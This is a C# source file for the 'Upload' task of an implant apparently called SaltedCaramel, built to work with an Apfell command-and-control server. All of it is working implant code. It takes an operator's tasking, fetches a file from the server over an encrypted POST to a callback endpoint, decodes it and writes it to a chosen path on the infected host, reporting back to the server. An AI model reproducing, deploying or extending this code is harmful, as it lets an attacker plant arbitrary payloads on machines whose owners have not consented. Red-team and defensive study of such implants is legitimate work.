using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics;
using System.IO;

/// <summary>
/// This task will upload a specified file from the Apfell server to the implant at the given file path
/// </summary>
namespace SaltedCaramel.Tasks
{
    internal class Upload
    {
        internal static byte[] GetFile(string file_id, SCImplant implant)
        {
            byte[] bytes;
            string fileEndpoint = implant.endpoint + "files/callback/" + implant.callbackId;
            try
            {
                string payload = "{\"file_id\": \"" + file_id + "\"}";
                // Encrypt json to send to server
                string encrypted = implant.crypto.Encrypt(payload);
                // Get response from server and decrypt
                string result = implant.crypto.Decrypt(HTTP.Post(fileEndpoint, encrypted));
                bytes = Convert.FromBase64String(result);
                return bytes;
            }
            catch
            {
                return null;
            }
        }
        internal static void Execute(SCTask task, SCImplant implant)
        {
            JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
            string file_id = json.Value<string>("file_id");
            string filepath = json.Value<string>("remote_path");

            Debug.WriteLine("[-] Upload - Tasked to get file " + file_id);

            // If file exists, don't write file
            if (File.Exists(filepath))
            {
                Debug.WriteLine($"[!] Upload - ERROR: File exists: {filepath}");
                implant.SendError(task.id, "ERROR: File exists.");
            }
            else
            {
                // First we have to request the file from the server with a POST
                string fileEndpoint = implant.endpoint + "files/callback/" + implant.callbackId;
                try // Try block for HTTP request
                {
                    string payload = "{\"file_id\": \"" + file_id + "\"}";
                    // Encrypt json to send to server
                    string encrypted = implant.crypto.Encrypt(payload);

                    string result = implant.crypto.Decrypt(HTTP.Post(fileEndpoint, encrypted));
                    byte[] output = Convert.FromBase64String(result);
                    try // Try block for writing file to disk
                    {
                        // Write file to disk
                        File.WriteAllBytes(filepath, output);
                        implant.SendComplete(task.id);
                        Debug.WriteLine("[+] Upload - File written: " + filepath);
                    }
                    catch (Exception e) // Catch exceptions from file write
                    {
                        // Something failed, so we need to tell the server about it
                        implant.SendError(task.id, e.Message);
                        Debug.WriteLine("[!] Upload - ERROR: " + e.Message);
                    }
                }
                catch (Exception e) // Catch exceptions from HTTP request
                {
                    // Something failed, so we need to tell the server about it
                    implant.SendError(task.id, e.Message);
                    Debug.WriteLine("[!] Upload - ERROR: " + e.Message);
                }
            }
        }
    }
}
